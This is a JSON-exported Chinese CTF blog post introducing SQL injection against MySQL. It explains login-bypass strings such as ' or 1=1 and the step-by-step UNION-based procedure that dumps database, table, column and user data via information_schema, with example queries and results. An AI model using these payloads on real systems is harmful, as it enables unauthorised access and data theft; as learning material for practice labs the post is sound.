{"title":"SQL入门","slug":"SQL入门","date":"2019-08-02T01:43:50.000Z","updated":"2019-09-03T14:30:48.997Z","comments":true,"path":"api/articles/SQL入门.json","photos":[],"link":"","excerpt":"Sql注入真的超神奇的，我怎么都学不会呢！<br>😀","covers":null,"content":"<p>Sql注入真的超神奇的，我怎么都学不会呢！<br>😀</p>\n<a id=\"more\"></a>\n<h1 id=\"开始之前\"><a href=\"#开始之前\" class=\"headerlink\" title=\"开始之前\"></a>开始之前</h1><h2 id=\"常用函数\"><a href=\"#常用函数\" class=\"headerlink\" title=\"常用函数\"></a>常用函数</h2><h3 id=\"系统函数\"><a href=\"#系统函数\" class=\"headerlink\" title=\"系统函数\"></a>系统函数</h3><ul>\n<li>version() mysql版本</li>\n<li>user() 数据库用户名</li>\n<li>database() 数据库名</li>\n<li>@@datadir 数据库路径</li>\n<li>@@version_compile_os 操作系统版本</li>\n</ul>\n<h3 id=\"字符串连接函数\"><a href=\"#字符串连接函数\" class=\"headerlink\" title=\"字符串连接函数\"></a>字符串连接函数</h3><ul>\n<li>concat(str1,str2, …) 没有分隔符的连接字符串</li>\n<li>concat_ws(separator,str1,str2,…) 有分隔符的连接字符串</li>\n<li>group_concat(str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据</li>\n</ul>\n<h3 id=\"常用尝试语句\"><a href=\"#常用尝试语句\" class=\"headerlink\" title=\"常用尝试语句\"></a>常用尝试语句</h3><ul>\n<li>or 1=1 –+(注释符)</li>\n<li>‘ or 1=1 –+</li>\n<li>“ or 1=1 –+</li>\n<li>) or 1=1 –+</li>\n<li>‘) or 1=1 –+</li>\n<li>“) or 1=1 –+</li>\n<li>“)) or 1=1 –+</li>\n<li>–+可以用#替换</li>\n</ul>\n<p>查询语句一般为</p>\n<pre><code>$sql=&quot;SELECT * from users where id = &apos;$id&apos; limit 0,1&quot;</code></pre><p>从上面的尝试语句我们可以看出来语句的作用有两个，一个是人为闭合 <code>$id</code> 后面的半个单引号，一个是注释整个语句后的引号。</p>\n<h3 id=\"union-操作符\"><a href=\"#union-操作符\" class=\"headerlink\" title=\"union 操作符\"></a>union 操作符</h3><p>union操作符用来合并两个或多个SELECT语句的结果集。使用union时的select语句必须拥有相同数量的列，同时列也必须有相似的数据类型，且每条select语句中列的顺序必须相同。</p>\n<p>例如这两有三个数据表</p>\n<pre><code>+-----------------+\n| Tables_in_test1 |\n+-----------------+\n| emails          |\n| user            |\n| users           |\n+-----------------+\n\nselect * from emails;\n+--------+-------------+\n| number | addr        |\n+--------+-------------+\n|  1     | 123@126.com |\n+--------+-------------+\n1 row in set (0.00 sec)\n\n+----+--------------------------------+----------+\n| id | username                       | password |\n+----+--------------------------------+----------+\n|  1 | admin                          | 1234567  |\n|  2 | 012345678901234567890123456789 | 1234567  |</code></pre><p>两个表的列数量不同则我们就无法使用UNION</p>\n<pre><code>mysql&gt; select * from emails UNION select * from user;\nERROR 1222 (21000): The used SELECT statements have a different number of columns</code></pre><p>默认的，UNION操作符选取不同的值，如果允许重复的话请使用UNION ALL。另外，UNION结果集中的列名总是等于UNION中第一个SELECT结果的列名。</p>\n<h3 id=\"逻辑运算\"><a href=\"#逻辑运算\" class=\"headerlink\" title=\"逻辑运算\"></a>逻辑运算</h3><p>为什么我们称 <code>&#39; or 1=1#</code> 为万能密码？</p>\n<p>查询语句是<code>select * from admin where username = &#39;admin&#39; and passwd = &#39;&#39; or 1=1#&#39;</code> 时我们可以不输入密码进行登陆账户，原因在于where 后面的三个条件语句<code>username = &#39;admin&#39;</code>  <code>and passwd=&#39;&#39;</code>  <code>or 1=1</code>。三个子句用 and 、 or 连接，在sql语句中 and 运算符的优先级高于 or 运算符。在计算时第一个子句为真，第二个为假，二者and以后为假，这个假的结果再与第三个or ，结果为真，所以这整句的结果就恒真了。</p>\n<h2 id=\"UNION-联合查询注入\"><a href=\"#UNION-联合查询注入\" class=\"headerlink\" title=\"UNION 联合查询注入\"></a>UNION 联合查询注入</h2><p>关于UNION 的用法请参考第一节。</p>\n<p>使用联合查询注入利用的前提是页面有回显位。</p>\n<p>所谓回显位是指在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展现在页面中，这个展示数据的位置就叫回显位。</p>\n<p>联合查询的基本步骤</p>\n<ol>\n<li>找到注入点判断闭合方式</li>\n<li>判断数据库类型</li>\n<li>判断查询列数</li>\n<li>判断回显位</li>\n<li>获取数据库名</li>\n<li>获取表名</li>\n<li>获取字段名</li>\n<li>获取字段中的数据</li>\n</ol>\n<p>ORDER BY子句是基于一个或多个字段按照升序或降序对其中的数据进行排序。一些数据库默认的对查询结果进行升序排序，例如mysql。</p>\n<p>我们可以指定字段名进行排序。这里我们有一张表</p>\n<pre><code>+----+----------+-----+-----------+----------+\n| ID | NAME     | AGE | ADDRESS   | SALARY   |\n+----+----------+-----+-----------+----------+\n|  1 | Ramesh   |  32 | Ahmedabad |  2000.00 |\n|  2 | Khilan   |  25 | Delhi     |  1500.00 |\n|  3 | kaushik  |  23 | Kota      |  2000.00 |\n|  4 | Chaitali |  25 | Mumbai    |  6500.00 |\n|  5 | Hardik   |  27 | Bhopal    |  8500.00 |\n|  6 | Komal    |  22 | MP        |  4500.00 |\n|  7 | Muffy    |  24 | Indore    | 10000.00 |\n+----+----------+-----+-----------+----------+</code></pre><p>查询语句例如 </p>\n<pre><code>SELECT * FROM CUSTOMERS\n   ORDER BY NAME, SALARY;</code></pre><p>查询结果如下</p>\n<pre><code>+----+----------+-----+-----------+----------+\n| ID | NAME     | AGE | ADDRESS   | SALARY   |\n+----+----------+-----+-----------+----------+\n|  4 | Chaitali |  25 | Mumbai    |  6500.00 |\n|  5 | Hardik   |  27 | Bhopal    |  8500.00 |\n|  3 | kaushik  |  23 | Kota      |  2000.00 |\n|  2 | Khilan   |  25 | Delhi     |  1500.00 |\n|  6 | Komal    |  22 | MP        |  4500.00 |\n|  7 | Muffy    |  24 | Indore    | 10000.00 |\n|  1 | Ramesh   |  32 | Ahmedabad |  2000.00 |\n+----+----------+-----+-----------+----------+</code></pre><p>同时，我们也可以指定字段的栏位进行排序，第一个字段为1，第二个为2，以此类推。</p>\n<p>这里我们有一张表</p>\n<pre><code>+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n|  1 | Dumb     | Dumb        |\n|  2 | Angelina | I-kill-you |\n|  3 | Dummy    | p@ssword   |\n|  4 | secure   | crappy      |\n|  5 | stupid   | stupidity  |\n|  6 | superman | genious     |\n|  7 | batman   | mob!le      |\n|  8 | admin    | admin       |\n|  9 | admin1   | admin1      |\n| 10 | admin2   | admin2      |\n| 11 | admin3   | admin3      |\n| 12 | dhakkan  | dumbo       |\n| 14 | admin4   | admin4      |\n| 15 | admin#   | 789          |\n+----+----------+------------+</code></pre><p>我们使用栏位进行查询</p>\n<pre><code>select * from users order by 3;</code></pre><p>查询结果按照第三栏进行排序</p>\n<pre><code>+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n| 15 | admin#   | 789         |\n|  8 | admin    | admin       |\n|  9 | admin1   | admin1      |\n| 10 | admin2   | admin2      |\n| 11 | admin3   | admin3      |\n| 14 | admin4   | admin4      |\n|  4 | secure   | crappy      |\n|  1 | Dumb     | Dumb        |\n| 12 | dhakkan  | dumbo       |\n|  6 | superman | genious     |\n|  2 | Angelina | I-kill-you |\n|  7 | batman   | mob!le      |\n|  3 | Dummy    | p@ssword   |\n|  5 | stupid   | stupidity  |\n+----+----------+------------+</code></pre><p>如果我们查询一个不存在的栏位呢？</p>\n<pre><code>select * from users order by 4;</code></pre><p>数据库将会报错</p>\n<pre><code>ERROR 1054 (42S22): Unknown column &apos;4&apos; in &apos;order clause&apos;</code></pre><p>基于此，我们可以利用二分法来对列数进行猜解。</p>\n<p>我们使用UNION来判断回显位，UNION的作用是将两个select查询结果合并</p>\n<pre><code>select id,username from users where id=4 union select 1,2;</code></pre><p>查询结果如下</p>\n<pre><code>+----+----------+\n| id | username |\n+----+----------+\n|  4 | secure   |\n|  1 | 2          |\n+----+----------+</code></pre><p>在展示数据的时候通常指取结果集的第一行数据，如果我们想取出后半部分的结果，就要使原来的查询查不出结果</p>\n<pre><code>select id,username from users where id=-4 union select 1,2;</code></pre><p>通过查询负数，这样就可以得到我们先要的数据了</p>\n<pre><code>+----+----------+\n| id | username |\n+----+----------+\n|  1 | 2        |\n+----+----------+</code></pre><p>得到回显位之后，获取数据库名就在回显位使用database()函数</p>\n<pre><code>select id,username from users where id=-4 union select 1,database();</code></pre><p>接下来查询库中所有表名，仍然是在回显位进行查询</p>\n<pre><code>select id,username from users where id=-4 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();</code></pre><p>然后是表中的列名</p>\n<pre><code>select id,username from users where id=-4 union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;;</code></pre><p>最后是数据</p>\n<pre><code>select id,username from users where id=-4 union select 1,username from users;</code></pre>","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"SQL","slug":"SQL","count":4,"path":"api/tags/SQL.json"}]}